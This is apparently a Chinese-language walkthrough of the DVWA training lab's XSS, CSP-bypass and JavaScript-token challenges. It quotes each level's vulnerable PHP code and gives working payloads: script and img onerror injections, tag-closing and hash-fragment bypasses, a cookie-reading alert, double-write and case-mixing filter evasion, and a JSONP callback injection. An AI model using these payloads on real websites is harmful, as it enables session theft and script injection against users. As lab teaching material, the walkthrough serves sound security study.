## XSS（DOM）

XSS(DOM)是一种基于DOM树的一种代码注入攻击方式，可以是反射型的，也可以是存储型的，所以它一直被划分第三种XSS

与前两种XSS相比，它最大的特点就是不与后台服务器交互，只是通过浏览器的DOM树解析产生

除了js，flash等脚本语言也有可能存在XSS漏洞

### 难度（low）

审计代码

    
    
    <?php
    
    # No protections, anything goes
    
    ?> 

无任何过滤

所以我们可以构造XSS代码，访问链接：

http://127.0.0.1/dvwa1/vulnerabilities/xss_d/?default=<script>alert(666)</script>

![1622117786_60af8d9a2f47e90f790c3.png!small?1622117786461](https://image.3001.net/images/20210527/1622117786_60af8d9a2f47e90f790c3.png!small?1622117786461)

我们查看源代码，可以看到，我们的脚本插入到代码中，所以执行了

![1622117917_60af8e1d8b93f7e077f23.png!small?1622117917701](https://image.3001.net/images/20210527/1622117917_60af8e1d8b93f7e077f23.png!small?1622117917701)

### 难度（medium）

审计代码

    
    
    <?php
    
    // Is there any input?
    if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
        $default = $_GET['default'];
        
        # Do not allow script tags
        if (stripos ($default, "<script") !== false) {
            header ("location: ?default=English");
            exit;
        }
    }
    
    ?>
    
    
    

可以看到，medium级别的代码先检查了default参数是否为空，如果不为空则将default等于获取到的default值。这里还使用了stripos
用于检测default值中是否有 <script ，如果有的话，则将 default=English 。

很明显，这里过滤了 <script (不区分大小写)，那么我们可以使用<img src=1 οnerrοr=('hack')>  
http://127.0.0.1/dvwa1/vulnerabilities/xss_d/?default=<img src=1
οnerrοr=alert(666)>

![1622118138_60af8efa4f93d6fa610cb.png!small?1622118138498](https://image.3001.net/images/20210527/1622118138_60af8efa4f93d6fa610cb.png!small?1622118138498)

此时并没有弹出任何页面

我们查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，所以img标签并没有发起任何作用。

![1622118219_60af8f4b9887b2d783b6c.png!small?1622118219766](https://image.3001.net/images/20210527/1622118219_60af8f4b9887b2d783b6c.png!small?1622118219766)

所以我们得先闭合前面的标签，我们构造语句闭合option标签：

> <option value=' " + lang + " '> " + decodeURI(lang) + " </option>

所以，我们构造该链接：

http://127.0.0.1/dvwa1/vulnerabilities/xss_d/?default=></option><img src=1
οnerrοr=alert(666)>

![1622118305_60af8fa144f12dbdc048e.png!small?1622118305530](https://image.3001.net/images/20210527/1622118305_60af8fa144f12dbdc048e.png!small?1622118305530)

但是我们的语句并没有执行，于是我们查看源代码，发现我们的语句中只有 >
被插入到了option标签的值中，因为</option>闭合了option标签，所以img标签并没有插入

![1622118363_60af8fdb8190ee49a1c87.png!small?1622118363679](https://image.3001.net/images/20210527/1622118363_60af8fdb8190ee49a1c87.png!small?1622118363679)

于是我们继续构造语句去闭合select标签，这下我们的img标签就是独立的一条语句了

我们构造该链接：

http://127.0.0.1/dvwa1/vulnerabilities/xss_d/?default=>/option></select><img
src=1 onerror=alert(666)>

![1622118461_60af903d9b464fc5990f1.png!small?1622118462268](https://image.3001.net/images/20210527/1622118461_60af903d9b464fc5990f1.png!small?1622118462268)

我们查看源代码，可以看到，我们的语句已经插入到页面中了

![1622118516_60af90740a27d4a82170a.png!small?1622118516266](https://image.3001.net/images/20210527/1622118516_60af90740a27d4a82170a.png!small?1622118516266)

### 难度（high）

审计代码

    
    
    <?php
    
    // Is there any input?
    if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    
        # White list the allowable languages
        switch ($_GET['default']) {
            case "French":
            case "English":
            case "German":
            case "Spanish":
                # ok
                break;
            default:
                header ("location: ?default=English");
                exit;
        }
    }
    
    ?>
    
    
    

可以发现使用了白名单的思想，只允许French，English，German以及Spanish，是否存在绕过的可能性呢，答案是肯定的，例如使用如下payload便会触发xss

http://127.0.0.1/dvwa1/vulnerabilities/xss_d/?default=#</option></select><BODY
ONLOAD=alert(document.cookie)>

可以看到我们在English之后添加了#，在url中#后边的内容不会发送到服务端，从而可以实现绕过。

![1622118772_60af9174413d921b9f2ae.png!small?1622118772800](https://image.3001.net/images/20210527/1622118772_60af9174413d921b9f2ae.png!small?1622118772800)

## XSS（Reflected）

反射型XSS是非持久性、参数型的跨站脚本。

反射型XSS的代码在Web应用参数中，例如搜索框的反射型XSS。

注意，反射型XSS代码出现在keyword参数中。

但是容易被发现，导致很多漏洞提交平台不接收反射型XSS漏洞。

### 难度（low）

审计代码

    
    
    <?php
    
    header ("X-XSS-Protection: 0");
    
    // Is there any input?
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
        // Feedback for end user
        echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
    }
    
    ?>
    

直接通过$_GET方式获取name的值，之后未进行任何编码和过滤，导致用户输入一段js脚本会执行。

    
    
    <script>alert(666)</script>

![1622118993_60af92517e41b0dec54c0.png!small?1622118994401](https://image.3001.net/images/20210527/1622118993_60af92517e41b0dec54c0.png!small?1622118994401)

### 难度（medium）

审计代码

    
    
    <?php
    
    header ("X-XSS-Protection: 0");
    
    // Is there any input?
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
        // Get input
        $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    
        // Feedback for end user
        echo "<pre>Hello ${name}</pre>";
    }
    
    ?>
    
    
    

对<script>标签做了过滤,可以使用事件绕过

    
    
    <a href = 'javascript:alert(666)'>click</a>

![1622119175_60af9307da6c982937e1f.png!small?1622119176593](https://image.3001.net/images/20210527/1622119175_60af9307da6c982937e1f.png!small?1622119176593)

### 难度（high）

审计代码

    
    
    <?php
    
    header ("X-XSS-Protection: 0");
    
    // Is there any input?
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
        // Get input
        $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    
        // Feedback for end user
        echo "<pre>Hello ${name}</pre>";
    }
    
    ?>
    
    
    

高难度是用preg_replace()函数进行正则过滤<script>标签，

 **使用 img 标签和其编码转换后的 XSS payload**

    
    
    <img src=1 onerror=alert(666)>

![1622119482_60af943a090fc7389eb8b.png!small?1622119482509](https://image.3001.net/images/20210527/1622119482_60af943a090fc7389eb8b.png!small?1622119482509)

## XSS（Stored）

存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。

### 难度（low）

审计代码

    
    
    <?php
    
    if( isset( $_POST[ 'btnSign' ] ) ) {
        // Get input
        $message = trim( $_POST[ 'mtxMessage' ] );
        $name    = trim( $_POST[ 'txtName' ] );
    
        // Sanitize message input
        $message = stripslashes( $message );
        $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Sanitize name input
        $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Update database
        $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        //mysql_close();
    }
    
    ?>
    
    
    

trim(string,charlist) ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B
、\r以及空格，可选参数charlist支持添加额外需要删除的字符

stripslashes(string)： 去除掉string字符的反斜杠＼

mysqli_real_escape_string(string,connection)
：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。

$GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP
在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。

可以看出，low级别的代码对我们输入的message和name并没有进行XSS过滤，而且数据存储在数据库中，存在比较明显的存储型XSS漏洞

我们输入 1 和 <script>alert(666)</script> ，可以看到，我们的js代码立即就执行了

![1622119828_60af9594cd0d3b68b35e5.png!small?1622119828954](https://image.3001.net/images/20210527/1622119828_60af9594cd0d3b68b35e5.png!small?1622119828954)

![1622119805_60af957d42e6f9ecb8098.png!small?1622119806656](https://image.3001.net/images/20210527/1622119805_60af957d42e6f9ecb8098.png!small?1622119806656)

### 难度（medium）

审计代码

    
    
    <?php
    
    if( isset( $_POST[ 'btnSign' ] ) ) {
        // Get input
        $message = trim( $_POST[ 'mtxMessage' ] );
        $name    = trim( $_POST[ 'txtName' ] );
    
        // Sanitize message input
        $message = strip_tags( addslashes( $message ) );
        $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $message = htmlspecialchars( $message );
    
        // Sanitize name input
        $name = str_replace( '<script>', '', $name );
        $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Update database
        $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        //mysql_close();
    }
    
    ?>
    
    
    

addslashes(string) ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 ' 、" 、\ 、NULL

strip_tags(string) ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签

htmlspecialchars(string)： 把预定义的字符 "<" （小于）、 ">" （大于）、& 、‘’、“” 转换为 HTML
实体，防止浏览器将其作为HTML元素

1.双写绕过

Burpsuite抓包改name参数为:<sc<script>ript>alert(/name/)</script>

![1622120204_60af970c872a19a75123b.png!small?1622120204648](https://image.3001.net/images/20210527/1622120204_60af970c872a19a75123b.png!small?1622120204648)

###### 2.大小写混淆绕过

Burpsuite抓包改name参数为:`<ScRipt>alert(/name/);</ScRipt>`

![1622120254_60af973e89ce729fba7bf.png!small?1622120254718](https://image.3001.net/images/20210527/1622120254_60af973e89ce729fba7bf.png!small?1622120254718)

###### 3.使用非 script 标签的 xss payload：

eg:img标签：

Burpsuite抓包改name参数为:`<img src=1 onerror=alert(/name/)>`

![1622120309_60af9775eaa17ea0a71fa.png!small?1622120310220](https://image.3001.net/images/20210527/1622120309_60af9775eaa17ea0a71fa.png!small?1622120310220)

最终弹框

![1622120455_60af98078d30468fc4c2c.png!small?1622120455827](https://image.3001.net/images/20210527/1622120455_60af98078d30468fc4c2c.png!small?1622120455827)

### 难度（high）

审计代码

    
    
    <?php
    
    if( isset( $_POST[ 'btnSign' ] ) ) {
        // Get input
        $message = trim( $_POST[ 'mtxMessage' ] );
        $name    = trim( $_POST[ 'txtName' ] );
    
        // Sanitize message input
        $message = strip_tags( addslashes( $message ) );
        $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $message = htmlspecialchars( $message );
    
        // Sanitize name input
        $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
        $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Update database
        $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        //mysql_close();
    }
    
    ?>
    
    
    

这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。

Burpsuite抓包改name参数为`<img src=1 onerror=alert(/name/)>`

![1622120686_60af98eec44c186b20d14.png!small?1622120687158](https://image.3001.net/images/20210527/1622120686_60af98eec44c186b20d14.png!small?1622120687158)

![1622121027_60af9a43d16e1e117ba50.png!small?1622121028010](https://image.3001.net/images/20210527/1622121027_60af9a43d16e1e117ba50.png!small?1622121028010)

## CSP Bypass

内容安全策略（CSP）使服务器管理员可以通过指定浏览器应认为是可执行脚本的有效源的域来减少或消除XSS可能发生的向量。然后，兼容CSP的浏览器将仅执行从这些允许列出的域接收的源文件中加载的脚本，忽略所有其他脚本（包括内联脚本和事件处理HTML属性）。  
除了限制可以从中加载内容的域之外，服务器还可以指定允许使用哪些协议;
例如（理想情况下，从安全角度来看），服务器可以指定必须使用HTTPS加载所有内容。完整的数据传输安全策略不仅包括强制HTTPS进行数据传输，还包括使用安全标记标记所有cookie，并提供从HTTP页面到其HTTPS对应项的自动重定向。站点还可以使用Strict-Transport-SecurityHTTP标头来确保浏览器仅通过加密通道连接到它们。  
两种方法可以启用 CSP。  
一种是通过 HTTP 头信息的Content-Security-Policy的字段。  
一种是通过网页的<meta>标签

### 难度（low）

审计代码

    
    
    <?php
    
    $headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, jquery and google analytics.
    
    header($headerCSP);
    
    # https://pastebin.com/raw/R570EE00
    
    ?>
    <?php
    if (isset ($_POST['include'])) {
    $page[ 'body' ] .= "
        <script src='" . $_POST['include'] . "'></script>
    ";
    }
    $page[ 'body' ] .= '
    <form name="csp" method="POST">
        <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
        <input size="50" type="text" name="include" value="" id="include" />
        <input type="submit" value="Include" />
    </form>
    ';
    
    
    

![1622176111_60b0716f39d7c50b609a9.png!small?1622176112968](https://image.3001.net/images/20210528/1622176111_60b0716f39d7c50b609a9.png!small?1622176112968)

    
    
    $headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com ht

此时可以上pastebin网站上自己写一个javascript代码alert(“hahaha”)，保存后记住链接，

    
    
    https://pastebin.com/raw/zSLDySJn

然后在上面界面中输入链接，结果如下

![1622176154_60b0719a43b11dcaf3f0f.png!small?1622176156011](https://image.3001.net/images/20210528/1622176154_60b0719a43b11dcaf3f0f.png!small?1622176156011)

在pastebin上保存的js代码被执行了。那就是因为pastebin网站是被信任的。攻击者可以把恶意代码保存在收信任的网站上，然后把链接发送给用户点击，实现注入。

### 难度（medium）

审计代码

    
    
    <?php
    
    $headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
    
    header($headerCSP);
    
    // Disable XSS protections so that inline alert boxes will work
    header ("X-XSS-Protection: 0");
    
    # <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
    
    ?>
    <?php
    if (isset ($_POST['include'])) {
    $page[ 'body' ] .= "
        " . $_POST['include'] . "
    ";
    }
    $page[ 'body' ] .= '
    <form name="csp" method="POST">
        <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
        <input size="50" type="text" name="include" value="" id="include" />
        <input type="submit" value="Include" />
    </form>
    ';
    

http头信息中的script-src的合法来源发生了变化，说明如下 unsafe-inline，允许使用内联资源，如内联<
script>元素，javascript:URL，内联事件处理程序（如onclick）和内联< style>元素。必须包括单引号。 nonce-source，仅允许特定的内联脚本块，nonce=“TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA”
现在更加简单了，可以直接输入以下代码

    
    
    <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(666)</script>

![1622176296_60b07228471330097bf14.png!small?1622176297994](https://image.3001.net/images/20210528/1622176296_60b07228471330097bf14.png!small?1622176297994)

nonce是设定好的，允许运行

### 难度（high）

审计代码

![1622176391_60b072876fa24dee902e3.png!small?1622176393090](https://image.3001.net/images/20210528/1622176391_60b072876fa24dee902e3.png!small?1622176393090)

![1622176412_60b0729c4358f31c529a3.png!small?1622176413833](https://image.3001.net/images/20210528/1622176412_60b0729c4358f31c529a3.png!small?1622176413833)

这个级别已经没有输入框了, 不过题目已经给了足够多的提示. 首先先看一下 CSP 头, 发现只有 `script-src 'self';`,
看来只允许本界面加载的 javascript 执行. 然后研究了一下这个点击显示答案的逻辑(逻辑在 `source/high.js`里), 大致如下:
点击按钮 -> js 生成一个 script 标签(src 指向 source/jsonp.php?callback=solveNum), 并把它加入到
DOM 中 -> js 中定义了一个 solveNum 的函数 -> 因此 script 标签会把远程加载的
`solveSum({"answer":"15"})`当作 js 代码执行, 而这个形式正好就是调用了 solveSum 函数,
然后这个函数就会在界面适当的位置写入答案.

本来嘛, 应该是没办法修改在服务器的 jsonp.php 文件的(除非结合别的漏洞, 拿 shell 后修改). 然而,
我后来在查看服务端源码的时候发现了这个:

![1622176450_60b072c23ebc51389aba1.png!small?1622176451871](https://image.3001.net/images/20210528/1622176450_60b072c23ebc51389aba1.png!small?1622176451871)

竟然还偷偷接收 include 参数(不清楚是不是作者复用了之前 Medium 的代码). 总之, 这肯定能作为一个注入点, 我开始打算用简单粗暴的
`<script>alert('hacked')</script>`来搞定的, 谁知道, 这种是属于 'unsafe-inline' 形式的,
所以被限制执行了. 嗯... 既然如此的话, 那我就利用 src 吧.

![1622176473_60b072d9ed6f168bc8b6d.png!small?1622176475523](https://image.3001.net/images/20210528/1622176473_60b072d9ed6f168bc8b6d.png!small?1622176475523)

这个即使你不看源码, 你做几个测试也会发现, 那个 callback 参数可以被操控以生成任何你想要得到的结果, 比如 alert, 因此可以构造
Payload: `<script src="source/jsonp.php?callback=alert('hacked');"></script>`,
并把这个当做 include 参数传给界面就 注入成功!

## JavaScript

### 难度（low）

如果你改成 “success” 提交一下会出现了这个，Invalid token。这是什么回事呢？

![1622176670_60b0739ef392d3a6cfcc4.png!small?1622176672847](https://image.3001.net/images/20210528/1622176670_60b0739ef392d3a6cfcc4.png!small?1622176672847)

你可以打开控制台（F12），看看情况。

![1622176697_60b073b941c5bac047eb2.png!small?1622176699202](https://image.3001.net/images/20210528/1622176697_60b073b941c5bac047eb2.png!small?1622176699202)

你会看到这个 token，不是后台生成的，而是前台生成的。。。而前台生成的 token，是用 `md5("ChangeMe")`，而后台期待的 md5 是
`md5("success")`。  
所以你在输入框中输入 success 之后，还得在控制台在调用 `generate_token()`函数。

结果如下

![1622176723_60b073d3dcd4750557f4d.png!small?1622176728450](https://image.3001.net/images/20210528/1622176723_60b073d3dcd4750557f4d.png!small?1622176728450)

### 难度（medium）

思路是一样的，只是生成 token 的函数放到另外的 js 文件中了。

![1622176768_60b074008bd821aa0fba4.png!small](https://image.3001.net/images/20210528/1622176768_60b074008bd821aa0fba4.png!small)

如果你打开这个 js 文件
<http://192.168.0.110:5678/vulnerabilities/javascript/source/medium.js>，你会看到这样

![1622176846_60b0744ec3c21e0b99fc3.png!small?1622176848361](https://image.3001.net/images/20210528/1622176846_60b0744ec3c21e0b99fc3.png!small?1622176848361)

所以，在输入框输入 “success” 之后，在控制台中，输入`do_elsesomething("XX")`就可以了。

![1622176905_60b07489d10bb8fa7e13e.png!small?1622176907549](https://image.3001.net/images/20210528/1622176905_60b07489d10bb8fa7e13e.png!small?1622176907549)

### 难度（high）

高级和中级类似，生成 token 的逻辑在额外的 js 文件中。和中级不同的是，这里的 JS 经过了混淆的。。。就显得很混乱。

<http://192.168.0.110:5678/vulnerabilities/javascript/source/high.js>  
  
截取其中的一段给大家看看

    
    
    var a=['fromCharCode','toString','replace','BeJ','\x5cw+','Lyg','SuR','(w(){\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\x202L=!1R&&1c\x202M===\x271n\x27;q\x202o=!Y.2S&&1c\x202d===\x271n\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\x20p(2L){Y=2M}q\x202G=!Y.3Q&&1c\x202g===\x271n\x27&&2g.X;q\x202s=1c\x202l===\x27w\x27&&2l.3P;q\x201y=!Y.3H&&1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=
    

这不是正常人类能看懂的。  
  
而
[http://deobfuscatejavascript.com](http://deobfuscatejavascript.com/)中提供的功能是，把混淆后的代码转成人类能看懂一些
js 代码  
  
其中关键的部分是这里：

![1622176990_60b074dee9b4fa653829b.png!small?1622176992666](https://image.3001.net/images/20210528/1622176990_60b074dee9b4fa653829b.png!small?1622176992666)

这里生成 token 的步骤是：

1、执行`token_part_1("ABCD", 44)`

2、执行`token_part_2("XX")`(原本是延迟 300ms执行的那个）

3、点击按钮的时候执行 `token_part_3`

所以我们在输入框输入 success 后，再到控制台中输入`token_part_1("ABCD",
44)`和`token_part_2("XX")`这两个函数就可以了。

![1622177017_60b074f9c0cf6d5967954.png!small?1622177019371](https://image.3001.net/images/20210528/1622177017_60b074f9c0cf6d5967954.png!small?1622177019371)

